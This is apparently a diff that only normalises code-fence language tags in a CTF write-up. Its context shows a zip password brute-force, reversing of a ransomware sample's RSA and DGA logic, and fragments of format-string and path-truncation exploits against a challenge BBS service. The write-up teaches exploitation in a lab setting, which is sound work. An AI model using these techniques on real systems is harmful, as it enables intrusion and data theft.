@@ -42,12 +42,12 @@ The file is hosted at http://fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg:31080/32552
 Flag?
 ```
 The zip file is password-protected and has one file `temp.mess`. According to the challenge description, `they are using a simple password (6 characters, hexadecimal) on the zip files` and thus we can bruteforce the zip password. Since we know the password is hexadecimal, a more efficient approach would be to use hashcat with masks, however for simplicity sake I used JohnTheRipper without any specific settings.
-```Bash
+```bash
 ~/CTF-Tools/JohnTheRipper/run/zip2john 325528f1f0a95ebbcdd78180e35e2699.zip > /tmp/a
 ~/CTF-Tools/JohnTheRipper/run/john /tmp/a
 ```
 With this we get the password `0b1f46`, that can be used to extract the `temp.mess` file. Running `file` on it, we can see the following:
-```Bash
+```bash
 file /ctf/CTF/tisc20/1/temp.mess
 /ctf/CTF/tisc20/1/temp.mess: ASCII text, with very long lines
 ```
@@ -56,12 +56,12 @@ Manual inspection also shows that the content looks like so
 QlpoOTFBWSZTWbE5WdMCwNtJAHIAf+A/AGOOn2d7UGjT1t7d62zTpNZWErWnu6c+3b3vT2wvY332+9rXdj2wvN27uh67Zq73F97Od9tDXpebJW++4rkF5vb...
 ```
 Having seen many instances of base64-encoded data this can easily be identified as base64-encoded data. Thus we can decode it with the following command.
-```Bash
+```bash
 base64 -d temp.mess > decoded
 ```
 Repeating this process for a while, I could tell that this is a matryoshka-style challenge with many layers of encoding (as it is mentioned in the description as well). At first, I continued to work on this manually, using a helper script to deal with base64 and hex encodings:
 
-```Python
+```python
 #!/usr/bin/env python
 import sys
 with open(sys.argv[1]) as f:
@@ -122,7 +122,7 @@ My first approach was to test if the encryption key and IV were hardcoded or eas
 
 This lead me to a new direction, determining how the `keydetails-enc.txt` file is interpreted as it's name definitely makes it seem useful for decrypting. The encrypted files provided also had this file, so if it would be great to know how to parse this file. Setting a breakpoint on `io/ioutil.WriteFile`, I can find where the `keydetails-enc.txt` file is written to, and use the `backtrace` command to determine that the `main.main` function created this file. The relevant code in the area of the call looked like so in the decompiler.
 
-```C
+```c
 math_big_nat_bytes(a1, *((__int64 *)&a1 + 1), v90, v124, v92, v93, (_DWORD)v113, v91, v90);
   if ( v115 > v124 )
     runtime_panicSliceB(a1, *((__int64 *)&a1 + 1));
@@ -150,7 +150,7 @@ Seeing this mess of code, I was still reluctant to perform proper static analysi
 
 After seeing this, everything made much more sense! The embedded public key we extracted is used to RSA encrypt the `keydetails-enc.txt` which contains the AES paramters used for symmetric decryption of the files attacked by the ransomware. Now I had to figure out how to decrypt the `keydetails-enc.txt` making the assumption that it was RSA encrypted with the public key. As mentioned earlier, the parameters were `e=3` and `N=8192bit number`. This particular combination of a large modulus and a small encryption exponent may allow the ciphertext to be trivially decrypted by a direct root attack. Doing this in python:
 
-```Python
+```python
 import sys
 from Crypto.Util.number import long_to_bytes, bytes_to_long
 
@@ -173,7 +173,7 @@ yielded a url-encoded form of the encryption parameters used in the AES encrypti
 
 My next thought then was to make use of the ransomware binary itself to help me decrypt the encrypted data. I thus modified my extraction script accordingly to allow me to inject the IV and encryption key into memory through GDB.
 
-```Python
+```python
 import sys
 from pwn import u32
 from urllib import unquote
@@ -230,7 +230,7 @@ SUBMISSION_TOKEN? LdWaGOgyfbVQromGEgmzfADJYNpGEPKLUgjiudRJfMoKzpXyklQgNqSxSQeNYG
 Where (domain name) can we find the ransomware servers on 2054-03-21T16:19:03.000Z?
 ```
 And so it seems we'll have to reverse the domain generation algorithm (DGA) used to determine the domain used at any point of time. My first instinct was to look for the code that would make the outbound request to the C2 server as this would likely be passed the C2 domain. Eventually I found the `net/http.(*Client).PostForm` function that is called by `main.main`. Setting a breakpoint within the function, I see the C2 domain passed as an argument in the stack.
-```C
+```c
 0x000000c00013dc00│+0x0000: 0x0000000000662417  →  <main.main+2759> cmp QWORD PTR [rsp+0x28], 0x0        ← $rsp
 0x000000c00013dc08│+0x0008: 0x00000000009270a0  →  0x0000000000000000
 0x000000c00013dc10│+0x0010: 0x000000c00001c270  →  "http://dy8j69ju5q6v95osmku8ah61xnm8vzxgs5p.cf"
@@ -238,7 +238,7 @@ And so it seems we'll have to reverse the domain generation algorithm (DGA) used
 It is also conveniently pointed to by `rbx` and `rcx` registers.
 
 Now that I knew where to extract the generated C2 domain, I looked for how to instrument the binary to allow it to generate domains for arbitrary times given. After some fumbling with hooking syscalls I realised it was not working so I did some googling to find common Golang functions used to determine time. This yielded `time.Now` (`time_Now` in IDA) which internally calls `time.now` to actually get the date/time. I then made a gdb script that would "automatically" change the return value of `time.now`.
-```Python
+```python
 # Recreated because I lost the old script
 gef config context.enable 0
 set follow-fork-mode parent
@@ -271,7 +271,7 @@ However, after testing this method, I noticed that the C2 domain generated was c
 This was quite interesting as it returned `datetime` which may be the reason why instrumenting `time.Now` did not allow me to change the generated domain. However, it wasn't as trivial for me to identify where to change the date/time value extracted from this. Instead, I turned my effort to the domain generating function `main.QbznvaAnzrTrarengvbaNytbevguz` and did a quick scan of the functions it called.
 
 From a quick overview of the code, I could identify calls to string manipulation functions like `runtime.concatstring3` and functions related to random generation like `math/rand.Intn` and `math/rand.Seed`. The presence of these functions made me quite confident that I was right to guess that this function did indeed generate the C2 domain. Checking the xrefs for `math/rand.Seed`, I noticed that the DGA function only called it once. Setting a breakpoint on the call, I inspected the seed value passed.
-```C
+```c
 ───────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x000000c000133aa8│+0x0000: 0x000000c000062150  →  0x0000000000753680  →  0x00000000006a41c0  →  0x0000000000000010      ← $rsp
 0x000000c000133ab0│+0x0008: 0x000000000000be7e  <=========== Arg 1
@@ -299,7 +299,7 @@ The seed value seemed rather small, and inspecting the code slightly preceeding 
 ```
 If we take `0xbe7e` and shift it 0xf bits to the left we get `1597964288`, which is a value very close to the current epoch time. Therefore, I could make a safe assumption that the DGA used pseudorandom generation with a seed determined by the current epoch time right shifted 0xf bits (to prevent the domain from changing each second). All I had to do now was to hook this function instead, and I could instrument the binary to generate the C2 domain for any time I provide. I did this with the following python script that dynamically generates a gdb script and runs it.
 
-```Python
+```python
 from pwn import *
 import subprocess as sp
 import dateutil.parser as dp
@@ -379,7 +379,7 @@ This challenge provided a binary (`bbs`) and a remote service that looked like s
 USERNAME:
 ```
 I first loaded up the binary in IDA and ... stripped statically linked binary. I loaded up some FLIRT signatures from the following [database](https://github.com/push0ebp/sig-database) and found that the `libc6_2.27-0ubuntu3_amd64` signature yielded the most function matches. Repeating this with a few more signatures to rename more functions, I then had a slightly better binary to work with. When looking into the `main` function (the address passed in `rdi` in the entrypoint stub) I could tell some binary obfuscation was going on.
-```C
+```c
 LOAD:00000000004020CA ; __int64 __fastcall main(_QWORD, __int64, __int64)
 LOAD:00000000004020CA main:                                   ; CODE XREF: LOAD:00000000004020D7↓j
 LOAD:00000000004020CA                                         ; DATA XREF: start+1D↑o
@@ -388,7 +388,7 @@ LOAD:00000000004020D4                 xor     rax, rax
 LOAD:00000000004020D7                 jmp     short near ptr main+6
 ```
 This sort of incomplete analysis was a tell-tale indicator that some anti analysis technique was being implemented. The short jump at the end indicated to me that the binary was making use of jumps in the middle of instructions, which is a very common technique I've seen in order to defeat decompilers and disassemblers as they have difficulty displaying code when the same address can be executed twice in context of different instructions. Hoping that this was only done for the function prologue, I manually traced the jumps to eventually reveal the actual function.
-```C
+```c
 LOAD:00000000004020DB main_main       proc near
 LOAD:00000000004020DB                 inc     eax
 LOAD:00000000004020DD                 push    rbp
@@ -407,7 +407,7 @@ However, I soon realised that this was done for pretty much every user-defined f
 
 After some code reading, I found the password checking function. The function had a few snippets of code that looked like so
 
-```C
+```c
 _t = time();
 v4 = _t;
 _srandom(_t);
@@ -435,13 +435,13 @@ so the else case at [4] is never reached
 ```
 Once we know this we can reverse the function to get a better understanding of the password checking. The rough idea seems to be that our password is "hashed" and compared to a hardcoded hash in memory
 
-```C
+```c
 return (unsigned int)prob_strcmp((__int64)hashed, (__int64)&byte_6DE010) == 0;
 ```
 
 The "hashing" algorithm was quite simple so it could possibly be manually reversed to determine the password, however I was not prepared to do the mental gymnastics in my head, so I wrote a z3 script to solve it for me.
 
-```Python
+```python
 from z3 import *
 hashed = [0x3, 0x13, 0x66, 0x23, 0x43, 0x66, 0x26, 0x16, 0x16, 0x23, 0x86, 0x36]
 inp = []
@@ -512,7 +512,7 @@ THREAD:
 ```
 We are allowed to write an arbitrary thread name to read without restrictions which is easily identifed as vulnerable to a path traversal attack. However, we are trying to read the file `/home/bbs/.passwd`, and the `.thr` extension would be an issue. This led me to think of [path truncation](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a#48f5) which is a technique I've seen in php LFI in the past. The general idea is that if you can extend the file path to really large size till it reaches the buffer size limit, the extension added on the back will cause an overflow and thus would not be included. This challenge made use of `snprintf`
 
-```C
+```c
 _snprintf(s, 255LL, path, v9); // s is the resulting filepath being read
                                // path = "/home/bbs/threads/%s.thr"
                                // v9 is user controlled data up to 255 bytes
@@ -575,7 +575,7 @@ stack ptr 1 -> stack ptr 2 -> somewhere in the stack
 ```
 We make use of the `%hhn` technique to overwrite the 1 byte of data pointed to by `stack ptr 1` which is the least significant byte of `stack ptr 2`, then `stack ptr 2` can be constantly changed to act as a sort of "cursor" that moves along the stack, allowing us to write to `stack ptr 2` byte-by-byte and form arbitrary data (like pointers!) in the stack. With this we can form an arbitrary pointer and start leaking data. I did some further optimisation and made use of DynELF to prepare the script to leak the binary. I had improved on [two](https://blog.idiot.sg/2018-09-04/tokyowesterns-ctf-2018-neighbour-c/) previous [implementations](https://github.com/ZetaTwo/pwny-racing-solutions/blob/master/challenges/challenge07-episode4/Lord_Idiot/exploit.py) of this technique to prepare the following script.
 
-```Python
+```python
 from pwn import *
 
 r = remote("fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg", 42000)
@@ -649,7 +649,7 @@ while True:
 
 However, the script was painfully slow and was not able to leak enough of the binary to see the flag even after 2 hours of dumping non-stop. At this point, I was very frustrated as I was just staring at the script move slowly and so I took the progress of the binary and analysed the leaked code to see what was going on.
 
-```C
+```c
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
     __int64 v3; // rdx
@@ -679,7 +679,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 While incomplete, this showed me roughly what was going on with the binary, and revealed a new functionality as I could now type "exit\x00" to cause the binary to return from main. After a frustrating journey looking at the slow leaking, I gave up and started working towards an RCE with what information I had. I had initially tried to prepare an arbitrary write to overwrite the GOT entry of `printf`, however this failed and I assume it's because the GOT may be readonly. Thus I had to leverage the ability to return from main, overwriting the saved return address of main to control `RIP` instead. After some painful blind crashing and lots of testing I finally created the following payload to gain RCE.
 
-```Python
+```python
 from pwn import *
 
 r = remote("fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg", 42000)
